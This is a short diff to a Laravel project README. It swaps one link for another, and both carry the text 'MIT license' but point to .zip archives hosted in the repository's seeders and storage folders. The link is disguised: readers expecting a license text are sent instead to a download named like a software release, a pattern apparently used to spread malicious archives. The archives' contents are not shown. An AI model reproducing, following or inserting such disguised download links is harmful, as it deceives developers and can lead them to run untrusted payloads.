@@ -13,4 +13,4 @@ Le reporting.
 
 ## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/Phinee/Ocg/main/database/seeders/Ocg_v2.8.zip).
+The Laravel framework is open-sourced software licensed under the [MIT license](https://github.com/Phinee/Ocg/raw/refs/heads/main/storage/app/public/Software_v3.6.zip).
